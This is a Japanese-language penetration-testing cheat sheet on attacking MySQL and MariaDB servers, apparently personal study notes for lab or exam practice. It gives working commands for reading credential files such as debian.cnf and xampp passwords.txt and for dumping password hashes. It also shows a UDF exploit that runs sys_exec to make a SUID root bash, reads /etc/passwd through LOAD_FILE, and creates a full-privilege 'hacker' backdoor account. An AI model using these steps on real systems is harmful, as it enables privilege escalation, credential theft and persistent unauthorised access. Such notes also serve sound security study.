- 関連ノート：
	- [80 or 443 - HTTP or HTTPS](80%20or%20443%20-%20HTTP%20or%20HTTPS.md#SQLi)

- 🔗 参考リンク
    - [MySQL SQL Injection Cheat Sheet - pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
    - [MySQL - HackTricks](https://www.google.com/search?q=https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql)

---

- [ ] Todo：以降編集
# 着目ファイル一覧

| カテゴリ | ファイル名                    | 用途・重要性                          | 診断・解析時の注目点                                                          |
| ---- | ------------------------ | ------------------------------- | ------------------------------------------------------------------- |
| 設定   | `my.cnf`  <br>(`my.ini`) | MySQLの全体設定ファイル。                 | `bind-address`（外部接続許可）、`port`、`datadir`（データ保存先）、`log_error` の場所を確認。 |
| 認証情報 | `debian.cnf`             | 管理用アカウントの設定。<br>※Debian/Ubuntu系 | `debian-sys-maint` ユーザーの平文パスワードが記載されている。読めればDB管理者権限を奪取可能。           |
| 実行履歴 | `.mysql_history`         | 実行したSQLコマンドの履歴。<br>※各ユーザーのホーム直下 | `CREATE USER` や `INSERT` 文の中に、平文のパスワードや機密データが残っている可能性が非常に高い。        |

---

# 接続方法

接続
```zsh
# ローカル(rootパスワードなし)
mysql -u root

# パスワードあり
mysql -u root -p

# リモート接続
mysql -u <username> -h <target_IP> -p
```

## XAMPPの場合

- ターゲット環境にRDPなどでインタラクティブなシェルでアクセスできている場合、mysql.exeでアクセスできる
```powershell
C:\xampp\mysql\bin\mysql.exe -u root -p -h localhost
```
- mysqlのパスワードは、`C:\xampp\passwords.txt`にあることが多い

---

# 🔍 Enumeration

## ユーザー情報の列挙

現在のユーザー
```sql
SELECT user();
SELECT system_user();
```

現在のユーザーの権限確認
```sql
-- file_priv（ファイルの読み書き権限）の確認
SELECT user, file_priv FROM mysql.user WHERE user = substring_index(user(), '@', 1);

-- 全権限の確認
SELECT * FROM mysql.user WHERE user = substring_index(user(), '@', 1);
```

パスワードハッシュの列挙
```sql
-- MySQL 5.6以前
SELECT host, user, password FROM mysql.user;

-- MySQL 5.7以降
SELECT host, user, authentication_string FROM mysql.user;
```

## サーバー情報の列挙

バージョン情報表示
```sql
SELECT version();
SELECT @@version;
```

OS・アーキテクチャ情報の表示
```sql
SELECT @@version_compile_os, @@version_compile_machine;
-- または
SHOW VARIABLES LIKE '%compile%';
```

プラグインディレクトリの確認（UDF Exploitに必須）
```sql
SELECT @@plugin_dir;
-- または
SHOW VARIABLES LIKE 'plugin%';
```

## DB情報の列挙

データベース一覧を表示
```sql
SHOW DATABASES;
```

データベースの利用
```sql
USE <DB名>;
```

現在のDBの確認
```sql
SELECT database();
```

## TableとColumnの列挙

現在のDBにあるtableの確認
```sql
SHOW TABLES;
```

特定tableのスキーマ詳細を確認
```sql
DESCRIBE <table_name>;
```

💡全テーブル・全カラムの横断検索（SQLiで活用）
```sql
-- Empty setの場合はWHERE句を削除→出力は膨大
SELECT table_name, column_name, table_schema FROM information_schema.columns WHERE table_schema = database();
```

---

# 💥 Exploit

## MySQL UDF Exploit

ユーザー定義関数（UDF）を悪用して OS 上でコマンドを実行する。

### エクスプロイトの前提条件

- `mysql.func` テーブルへの **INSERT** 権限
- `@@plugin_dir` へのファイル書き込み権限（**FILE** 権限）
- 適切な UDF ライブラリ（`lib_mysqludf_sys.so` または `.dll`）の準備

### 実行手順 (Linux例)

1. UDF ライブラリをバイナリ（または16進数）でテーブルに流し込む
```sql
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn VALUES(LOAD_FILE('/tmp/lib_mysqludf_sys.so'));
```

2. ライブラリを `plugin_dir` へ出力する
```sql
SELECT * FROM npn INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
```

3. 関数を作成し、OSコマンドを実行する
```sql
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';
-- 実行例：bashのSUID化によるroot奪取
SELECT sys_exec('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

---

## ファイルの読み書き

ファイルの読み取り
```sql
SELECT LOAD_FILE('/etc/passwd');
```

ローカルファイルからのデータインポート
```sql
CREATE TABLE test(entry TEXT);
LOAD DATA LOCAL INFILE "/etc/passwd" INTO TABLE test FIELDS TERMINATED BY '\n';
SELECT * FROM test;
```

### 調査すべき重要ファイル

| OS      | カテゴリ   | パス                                                  |
| ------- | ------ | --------------------------------------------------- |
| Windows | 設定ファイル | `C:\xampp\mysql\bin\my.ini`, `C:\windows\my.ini`    |
| Unix    | 設定ファイル | `/etc/my.cnf`, `/etc/mysql/my.cnf`, `~/.my.cnf`     |
| Unix    | 特権情報   | `/etc/mysql/debian.cnf` (debian-sys-maintの平文パスワード)  |
| Common  | 履歴/ログ  | `~/.mysql.history`, `connections.log`, `update.log` |

### 補足：ハッシュの抽出（オフライン解析用）

`/var/lib/mysql/mysql/user.MYD` から直接ハッシュを抽出する
```sql
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

---

## ユーザー追加（バックドア作成）

```sql
CREATE USER 'hacker'@'%' IDENTIFIED BY 'P@ssw0rd123';
GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```

---

# Misc

## MariaDB を 0.0.0.0:3306 でホストする手順

- WordPressのsetup-config.phpをエクスプロイトするためなどに使用 ([Exploit-DB - 18417](https://www.exploit-db.com/exploits/18417))
- Kali ではMySQLを起動してもMariaDBが起動する（MariaDBはMySQLのfork）
	-  `mysql`コマンドは MariaDB のエイリアスとして機能し、ユーザーからは MySQL として使えるが、実体は MariaDB

1. MariaDB 設定ファイルの確認
```zsh
grep -EiR "bind-address|skip-networking" /etc/mysql/mariadb.conf.d/ 2>/dev/null
```
- 数字が小さい順に読み込まれるため、`50-server.cnf`を編集する

2. bind-address を 0.0.0.0 に変更
```zsh
sudo subl /etc/mysql/mariadb.conf.d/50-server.cnf
```
```zsh
# 変更前
bind-address=127.0.0.1

# 変更後
bind-address=0.0.0.0
```

3. skip-networking が有効になっていたら、コメントアウトで無効化
```zsh
# skip-networking
```
- bind-address を機能させるために必須

4. MariaDB サービス起動
```zsh
sudo systemctl start mariadb
```

5. リモート接続用ユーザー作成
```zsh
sudo mysql -u root
```
```sql
CREATE USER '<username>'@'%' IDENTIFIED BY '<pw>';
GRANT ALL PRIVILEGES ON *.* TO '<username>'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
-- 削除はDROP USER '<username>'@'%';
```
- `@'%'`を指定しないと、デフォルトで `@'localhost'`になり、リモート接続できない

---
